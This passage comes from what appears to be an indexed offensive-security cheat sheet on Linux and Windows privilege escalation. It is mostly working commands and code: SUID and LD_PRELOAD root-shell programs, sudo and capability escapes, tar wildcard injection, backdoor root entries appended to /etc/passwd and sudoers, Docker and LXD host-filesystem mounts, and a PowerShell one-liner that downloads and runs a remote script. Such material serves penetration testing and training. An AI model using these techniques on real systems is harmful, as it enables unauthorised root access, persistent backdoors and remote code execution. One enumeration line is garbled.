<p>Steps</p> <ol> <li>Get the authorized_keys file. An example of this file would look like so:</li> </ol> <pre><code>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... \n</code></pre> <ol> <li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li> </ol> <pre><code>echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" &gt;&gt; /etc/ssh/ssh_config\necho \"PubkeyAcceptedKeyTypes=+ssh-dss\" &gt;&gt; /etc/ssh/sshd_config\n/etc/init.d/ssh restart\n</code></pre> <ol> <li>Get g0tmi1k's debian-ssh repository and unpack the keys:</li> </ol> <pre><code>git clone https://github.com/g0tmi1k/debian-ssh\ncd debian-ssh\ntar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2\n</code></pre> <ol> <li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>\"AAAA...\"</code> portion and grep the unpacked keys with it as:</li> </ol> <pre><code>grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'\ndsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub\n</code></pre> <ol> <li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:</li> </ol> <pre><code>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934\n</code></pre> <p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#scheduled-tasks","title":"Scheduled tasks","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#cron-jobs","title":"Cron jobs","text":"<p>Check if you have access with write permission on these files.  Check inside the file, to find other paths with write permissions.   </p> <pre><code>/etc/init.d\n/etc/cron*\n/etc/crontab\n/etc/cron.allow\n/etc/cron.d \n/etc/cron.deny\n/etc/cron.daily\n/etc/cron.hourly\n/etc/cron.monthly\n/etc/cron.weekly\n/etc/sudoers\n/etc/exports\n/etc/anacrontab\n/var/spool/cron\n/var/spool/cron/crontabs/root\n\ncrontab -l\nls -alh /var/spool/cron;\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny*\n</code></pre> <p>You can use pspy to detect a CRON job.</p> <pre><code># print both commands and file system events and scan procfs every 1000 ms (=1sec)\n./pspy64 -pf -i 1000 \n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#systemd-timers","title":"Systemd timers","text":"<pre><code>systemctl list-timers --all\nNEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES\nMon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service\nMon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service\nMon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\n\n3 timers listed.\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#suid","title":"SUID","text":"<p>SUID/Setuid stands for \"set user ID upon execution\", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p> <pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ ls /usr/bin/sudo -alh                  \n-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#find-suid-binaries","title":"Find SUID binaries","text":"<pre><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;\nfind / -uid 0 -perm -4000 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#create-a-suid-binary","title":"Create a SUID binary","text":"Function Description setreuid() sets real and effective user IDs of the calling process setuid() sets the effective user ID of the calling process setgid() sets the effective group ID of the calling process <pre><code>print 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\"/bin/sh\");\\n}' &gt; /tmp/suid.c   \ngcc -o /tmp/suid /tmp/suid.c  \nsudo chmod +x /tmp/suid # execute right\nsudo chmod +s /tmp/suid # setuid bit\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#capabilities","title":"Capabilities","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#list-capabilities-of-binaries","title":"List capabilities of binaries","text":"<pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ /usr/bin/getcap -r  /usr/bin\n/usr/bin/fping                = cap_net_raw+ep\n/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip\n/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep\n/usr/bin/rlogin               = cap_net_bind_service+ep\n/usr/bin/ping                 = cap_net_raw+ep\n/usr/bin/rsh                  = cap_net_bind_service+ep\n/usr/bin/rcp                  = cap_net_bind_service+ep\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#edit-capabilities","title":"Edit capabilities","text":"<pre><code>/usr/bin/setcap -r /bin/ping            # remove\n/usr/bin/setcap cap_net_raw+p /bin/ping # add\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#interesting-capabilities","title":"Interesting capabilities","text":"<p>Having the capability =ep means the binary has all the capabilities. <pre><code>$ getcap openssl /usr/bin/openssl \nopenssl=ep\n</code></pre></p> <p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p> <pre><code>cap_dac_read_search # read anything\ncap_setuid+ep # setuid\n</code></pre> <p>Example of privilege escalation with <code>cap_setuid+ep</code></p> <pre><code>$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7\n\n$ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\nsh-5.0# id\nuid=0(root) gid=1000(swissky)\n</code></pre> Capabilities name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypasses file and directory read/execute permission checks CAP_FOWNER This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports"},{"location":"redteam/escalation/linux-privilege-escalation/#sudo","title":"SUDO","text":"<p>Tool: Sudo Exploitation</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#nopasswd","title":"NOPASSWD","text":"<p>Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.</p> <pre><code>$ sudo -l\n\nUser demo may run the following commands on crashlab:\n    (root) NOPASSWD: /usr/bin/vim\n</code></pre> <p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p> <pre><code>sudo vim -c '!sh'\nsudo -u root vim -c '!sh'\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd","title":"LD_PRELOAD and NOPASSWD","text":"<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p> <pre><code>Defaults        env_keep += LD_PRELOAD\n</code></pre> <p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/sh\");\n}\n</code></pre> <p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>"},{"location":"redteam/escalation/linux-privilege-escalation/#doas","title":"Doas","text":"<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p> <pre><code>permit nopass demo as root cmd vim\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#sudo_inject","title":"sudo_inject","text":"<p>Using https://github.com/nongiach/sudo_inject</p> <pre><code>$ sudo whatever\n[sudo] password for user:    \n# Press &lt;ctrl&gt;+c since you don't have the password. \n# This creates an invalid sudo tokens.\n$ sh exploit.sh\n.... wait 1 seconds\n$ sudo -i # no password required :)\n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#cve-2019-14287","title":"CVE-2019-14287","text":"<pre><code># Exploitable when a user have the following permissions (sudo -l)\n(ALL, !root) ALL\n\n# If you have a full TTY, you can exploit it like this\nsudo -u#-1 /bin/bash\nsudo -u#4294967295 id\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#gtfobins","title":"GTFOBins","text":"<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p> <p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p> <p>gdb -nx -ex '!sh' -ex quit   sudo mysql -e '! /bin/sh'   strace -o /dev/null /bin/sh   sudo awk 'BEGIN {system(\"/bin/sh\")}'</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#wildcard","title":"Wildcard","text":"<p>By using tar with \u2013checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. \u201cTricking\u201d root to use the specific options is quite easy, and that's where the wildcard comes in handy.</p> <pre><code># create file for exploitation\ntouch -- \"--checkpoint=1\"\ntouch -- \"--checkpoint-action=exec=sh shell.sh\"\necho \"#\\!/bin/bash\\ncat /etc/passwd &gt; /tmp/flag\\nchmod 777 /tmp/flag\" &gt; shell.sh\n\n# vulnerable script\ntar cf archive.tar *\n</code></pre> <p>Tool: wildpwn</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#writable-files","title":"Writable files","text":"<p>List world writable files on the system.</p> <pre><code>find / -writable ! -user `whoami` -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \\; 2&gt;/dev/null\nfind / -perm -2 -type f 2&gt;/dev/null\nfind / ! -path \"*/proc/*\" -perm -2 -type f -print 2&gt;/dev/null\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#writable-etcsysconfignetwork-scripts-centosredhat","title":"Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)","text":"<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p> <p><pre><code>NAME=Network /bin/id  &amp;lt;= Note the blank space\nONBOOT=yes\nDEVICE=eth0\n\nEXEC :\n./etc/sysconfig/network-scripts/ifcfg-1337\n</code></pre> src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#writable-etcpasswd","title":"Writable /etc/passwd","text":"<p>First generate a password with one of the following commands.</p> <pre><code>openssl passwd -1 -salt hacker hacker\nmkpasswd -m SHA-512 hacker\npython2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")'\n</code></pre> <p>Then add the user <code>hacker</code> and add the generated password.</p> <pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash\n</code></pre> <p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p> <p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p> <p>Alternatively you can use the following lines to add a dummy user without a password.   WARNING: you might degrade the current security of the machine.</p> <pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd\nsu - dummy\n</code></pre> <p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>. </p>"},{"location":"redteam/escalation/linux-privilege-escalation/#writable-etcsudoers","title":"Writable /etc/sudoers","text":"<pre><code>echo \"username ALL=(ALL:ALL) ALL\"&gt;&gt;/etc/sudoers\n\n# use SUDO without password\necho \"username ALL=(ALL) NOPASSWD: ALL\" &gt;&gt;/etc/sudoers\necho \"username ALL=NOPASSWD: /bin/bash\" &gt;&gt;/etc/sudoers\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#nfs-root-squashing","title":"NFS Root Squashing","text":"<p>When no_root_squash appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p> <pre><code># remote check the name of the folder\nshowmount -e 10.10.10.10\n\n# create dir\nmkdir /tmp/nfsdir  \n\n# mount directory \nmount -t nfs 10.10.10.10:/shared /tmp/nfsdir    \ncd /tmp/nfsdir\n\n# copy wanted shell \ncp /bin/bash .  \n\n# set suid permission\nchmod +s bash   \n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#shared-library","title":"Shared Library","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#ldconfig","title":"ldconfig","text":"<p>Identify shared libraries with <code>ldd</code></p> <pre><code>$ ldd /opt/binary\n    linux-vdso.so.1 (0x00007ffe961cd000)\n    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)\n    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        \n</code></pre> <p>Create a library in <code>/tmp</code> and activate the path.</p> <pre><code>gcc \u2013Wall \u2013fPIC \u2013shared \u2013o vulnlib.so /tmp/vulnlib.c\necho \"/tmp/\" &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so\n/opt/binary\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#rpath","title":"RPATH","text":"<pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\"\n 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]\n\nlevel15@nebula:/home/flag15$ ldd ./flag15 \n linux-gate.so.1 =&gt;  (0x0068c000)\n libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x005bb000)\n</code></pre> <p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p> <pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\n\nlevel15@nebula:/home/flag15$ ldd ./flag15 \n linux-gate.so.1 =&gt;  (0x005b0000)\n libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x00737000)\n</code></pre> <p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p> <pre><code>#include&lt;stdlib.h&gt;\n#define SHELL \"/bin/sh\"\n\nint __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))\n{\n char *file = SHELL;\n char *argv[] = {SHELL,0};\n setresuid(geteuid(),geteuid(), geteuid());\n execve(file,argv,0);\n}\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#groups","title":"Groups","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#docker","title":"Docker","text":"<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p> <pre><code>$&gt; docker run -it --rm -v $PWD:/mnt bash\n$&gt; echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /mnt/etc/passwd\n</code></pre> <p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p> <pre><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash\n</code></pre> <p>Or use the following docker image from chrisfosterelli to spawn a root shell</p> <pre><code>$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease\nlatest: Pulling from chrisfosterelli/rootplease\n2de59b831a23: Pull complete \n354c3661655e: Pull complete \n91930878a2d7: Pull complete \na3ed95caeb02: Pull complete \n489b110c54dc: Pull complete \nDigest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0\nStatus: Downloaded newer image for chrisfosterelli/rootplease:latest\n\nYou should now have a root shell on the host OS\nPress Ctrl-D to exit the docker instance / shell\n\nsh-5.0# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>More docker privilege escalation using the Docker Socket.</p> <pre><code>sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash\nsudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#lxclxd","title":"LXC/LXD","text":"<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p> <pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ id\nuid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)\n</code></pre> <p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p> <pre><code># build a simple alpine image\ngit clone https://github.com/saghul/lxd-alpine-builder\n./build-alpine -a i686\n\n# import the image\nlxc image import ./alpine.tar.gz --alias myimage\n\n# run the image\nlxc init myimage mycontainer -c security.privileged=true\n\n# mount the /root into the image\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n\n# interact with the container\nlxc start mycontainer\nlxc exec mycontainer /bin/sh\n</code></pre> <p>Alternatively https://github.com/initstring/lxd_root</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#hijack-tmux-session","title":"Hijack TMUX session","text":"<p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p> <pre><code>export TMUX=/tmp/tmux-1000/default,1234,0 \ntmux ls\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#kernel-exploits","title":"Kernel Exploits","text":"<p>Precompiled exploits can be found inside these repositories, run them at your own risk ! * bin-sploits - @offensive-security * kernel-exploits - @lucyoa</p> <p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p> <p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code> Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.</p>"},{"location":"redteam/escalation/linux-privilege-escalation/#cve-2022-0847-dirtypipe","title":"CVE-2022-0847 (DirtyPipe)","text":"<p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p> <pre><code>https://www.exploit-db.com/exploits/50808\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#cve-2016-5195-dirtycow","title":"CVE-2016-5195 (DirtyCow)","text":"<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p> <pre><code># make dirtycow stable\necho 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\nhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\nhttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#cve-2010-3904-rds","title":"CVE-2010-3904 (RDS)","text":"<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p> <pre><code>https://www.exploit-db.com/exploits/15285/\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#cve-2010-4258-full-nelson","title":"CVE-2010-4258 (Full Nelson)","text":"<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p> <pre><code>https://www.exploit-db.com/exploits/15704/\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#cve-2012-0056-mempodipper","title":"CVE-2012-0056 (Mempodipper)","text":"<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p> <pre><code>https://www.exploit-db.com/exploits/18411\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#references","title":"References","text":"<ul> <li>SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</li> <li>Privilege escalation via Docker - April 22, 2015 - Chris Foster</li> <li>An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</li> <li>Exploiting wildcards on Linux - Berislav Kucan</li> <li>Code Execution With Tar Command - p4pentest</li> <li>Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</li> <li>HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</li> <li>Privilege Escalation via lxd - @reboare</li> <li>Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</li> <li>Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</li> <li>Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</li> <li>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</li> <li>SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</li> <li>The Dirty Pipe Vulnerability</li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/","title":"Windows - Privilege Escalation","text":""},{"location":"redteam/escalation/windows-privilege-escalation/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Windows Version and Configuration</li> <li>User Enumeration</li> <li>Network Enumeration</li> <li>Antivirus Enumeration</li> <li>Default Writeable Folders</li> <li>EoP - Looting for passwords<ul> <li>SAM and SYSTEM files</li> <li>HiveNightmare</li> <li>LAPS Settings</li> <li>Search for file contents</li> <li>Search for a file with a certain filename</li> <li>Search the registry for key names and passwords</li> <li>Passwords in unattend.xml</li> <li>Wifi passwords</li> <li>Sticky Notes passwords</li> <li>Passwords stored in services</li> <li>Passwords stored in Key Manager</li> <li>Powershell History</li> <li>Powershell Transcript</li> <li>Password in Alternate Data Stream</li> </ul> </li> <li>EoP - Processes Enumeration and Tasks</li> <li>EoP - Incorrect permissions in services</li> <li>EoP - Windows Subsystem for Linux (WSL)</li> <li>EoP - Unquoted Service Paths</li> <li>EoP - $PATH Interception</li> <li>EoP - Named Pipes</li> <li>EoP - Kernel Exploitation</li> <li>EoP - Microsoft Windows Installer<ul> <li>AlwaysInstallElevated</li> <li>CustomActions</li> </ul> </li> <li>EoP - Insecure GUI apps</li> <li>EoP - Evaluating Vulnerable Drivers</li> <li>EoP - Printers<ul> <li>Universal Printer</li> <li>Bring Your Own Vulnerability</li> </ul> </li> <li>EoP - Runas</li> <li>EoP - Abusing Shadow Copies</li> <li>EoP - From local administrator to NT SYSTEM</li> <li>EoP - Living Off The Land Binaries and Scripts</li> <li>EoP - Impersonation Privileges<ul> <li>Restore A Service Account's Privileges</li> <li>Meterpreter getsystem and alternatives</li> <li>RottenPotato (Token Impersonation)</li> <li>Juicy Potato (Abusing the golden privileges)</li> <li>Rogue Potato (Fake OXID Resolver))</li> <li>EFSPotato (MS-EFSR EfsRpcOpenFileRaw))</li> <li>PrintSpoofer (Printer Bug)))</li> </ul> </li> <li>EoP - Privileged File Write<ul> <li>DiagHub</li> <li>UsoDLLLoader</li> <li>WerTrigger</li> <li>WerMgr</li> </ul> </li> <li>EoP - Privileged File Delete</li> <li>EoP - Common Vulnerabilities and Exposures<ul> <li>MS08-067 (NetAPI)</li> <li>MS10-015 (KiTrap0D)</li> <li>MS11-080 (adf.sys)</li> <li>MS15-051 (Client Copy Image)</li> <li>MS16-032</li> <li>MS17-010 (Eternal Blue)</li> <li>CVE-2019-1388</li> </ul> </li> <li>EoP - $PATH Interception</li> <li>References</li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#tools","title":"Tools","text":"<ul> <li>PowerSploit's PowerUp <pre><code>powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks\n</code></pre></li> <li>Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock</li> <li>(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities <pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1\n</code></pre></li> <li>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</li> <li>Windows-Exploit-Suggester <pre><code>./windows-exploit-suggester.py --update\n./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt \n</code></pre></li> <li>windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems</li> <li>WindowsExploits - Windows exploits, mostly precompiled. Not being updated.</li> <li>WindowsEnum - A Powershell Privilege Escalation Enumeration Script.</li> <li>Seatbelt - A C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. <pre><code>Seatbelt.exe -group=all -full\nSeatbelt.exe -group=system -outputfile=\"C:\\Temp\\system.txt\"\nSeatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\\sam -password=\"yum \\\"po-ta-toes\\\"\"\n</code></pre></li> <li>Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind</li> <li>JAWS - Just Another Windows (Enum) Script <pre><code>powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt\n</code></pre></li> <li>winPEAS - Windows Privilege Escalation Awesome Script</li> <li>Windows Exploit Suggester - Next Generation (WES-NG) <pre><code># First obtain systeminfo\nsysteminfo\nsysteminfo &gt; systeminfo.txt\n# Then feed it to wesng\npython3 wes.py --update-wes\npython3 wes.py --update\npython3 wes.py systeminfo.txt\n</code></pre></li> <li>PrivescCheck - Privilege Escalation Enumeration Script for Windows <pre><code>C:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\nC:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"\nC:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\"\n</code></pre></li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration","title":"Windows Version and Configuration","text":"<pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n</code></pre> <p>Extract patchs and updates <pre><code>wmic qfe\n</code></pre></p> <p>Architecture</p> <pre><code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%\n</code></pre> <p>List all env variables</p> <pre><code>set\nGet-ChildItem Env: | ft Key,Value\n</code></pre> <p>List all drives</p> <pre><code>wmic logicaldisk get caption || fsutil fsinfo drives\nwmic logicaldisk get caption,description,providername\nGet-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#user-enumeration","title":"User Enumeration","text":"<p>Get current username</p> <pre><code>echo %USERNAME% || whoami\n$env:username\n</code></pre> <p>List user privilege</p> <pre><code>whoami /priv\nwhoami /groups\n</code></pre> <p>List all users</p> <pre><code>net user\nwhoami /all\nGet-LocalUser | ft Name,Enabled,LastLogon\nGet-ChildItem C:\\Users -Force | select Name\n</code></pre> <p>List logon requirements; useable for bruteforcing</p> <p>```powershell$env:usernadsc net accounts <pre><code>Get details about a user (i.e. administrator, admin, current user)\n\n```powershell\nnet user administrator\nnet user admin\nnet user %USERNAME%\n</code></pre></p> <p>List all local groups</p> <pre><code>net localgroup\nGet-LocalGroup | ft Name\n</code></pre> <p>Get details about a group (i.e. administrators)</p> <pre><code>net localgroup administrators\nGet-LocalGroupMember Administrators | ft Name, PrincipalSource\nGet-LocalGroupMember Administrateurs | ft Name, PrincipalSource\n</code></pre> <p>Get Domain Controllers</p> <pre><code>nltest /DCLIST:DomainName\nnltest /DCNAME:DomainName\nnltest /DSGETDC:DomainName\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#network-enumeration","title":"Network Enumeration","text":"<p>List all network interfaces, IP, and DNS.</p> <pre><code>ipconfig /all\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\nGet-DnsClientServerAddress -AddressFamily IPv4 | ft\n</code></pre> <p>List current routing 